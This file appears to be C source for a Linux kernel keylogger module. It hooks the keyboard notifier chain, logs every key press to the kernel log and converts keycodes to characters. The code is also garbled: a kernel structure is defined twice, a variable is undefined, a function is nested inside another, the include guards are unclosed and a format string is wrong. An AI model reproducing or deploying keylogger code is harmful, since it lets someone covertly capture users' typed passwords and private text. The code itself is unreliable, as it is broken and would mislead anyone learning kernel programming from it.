
#ifndef KEY_LOGGER
#define KEY_LOGGER
#include <linux/keyboard.h>
#include <linux/module.h>
#include <linux/kernel.h>

#include <linux/kernel.h>
#include <asm/uaccess.h>


#ifndef KEY_LOGGER_H
#define KEY_LOGGER_H

#include <linux/fs.h>
#include <linux/types.h>
#include <linux/module.h>
#include <linux/keyboard.h>
#include <linux/input.h>

#define KLG_MAJOR   60
#define FIRST_CD    KEY_1
#define LAST_CD     KEY_SLASH

struct notifier_block {
  int (*notifier_call)(struct notifier_block *, unsigned long, void *);
  struct notifier_block *next;
  int priority;
};

struct notifier_block {
  int (*notifier_call)(struct notifier_block *, unsigned long, void *);
  struct notifier_block *next;
  int priority;
};

static int hello_init(void)
{
  register_keyboard_notifier(&nb);
  return 0;
}

static void hello_release(void)
{
  unregister_keyboard_notifier(&nb);
}
//the only thing we need is keyboard notifier param (doc: http://lxr.free-electrons.com/source/include/linux/keyboard.h#L10). The vc_data is unnecessary for our purposes. 
//of the keyboard_notifier_param, we only need the value and shift mask to get this to work

int hello_notify(struct notifier_block *nblock, unsigned long code, void *_param) {
  struct keyboard_notifier_param *param = _param;
  struct vc_data *vc = param->vc;
  
  int ret = NOTIFY_OK;
  
  //if it's a down keypress only, dont' want to track key releases
  if (code == KBD_KEYCODE && down == 1)
 {
    printk(KERN_DEBUG "KEYLOGGER %i %s\n", param->value, param->shift);
    
    char ch_table[] = {'1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', '\r',
  	   '\t', 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', '\n',
  	   'X', 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', 'X',
  	   'X', '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/'};

    char get_ascii(int code)
    {
	if((code < FIRST_CD || code > LAST_CD) && code != KEY_SPACE) return 'X';
	else if(code == KEY_SPACE) return ' ';
	
	return ch_table[(code-FIRST_CD)];
   }
  }  
}

static struct notifier_block nb = {
  .notifier_call = hello_notify
};

module_init(hello_init);
module_exit(hello_release);

#endif
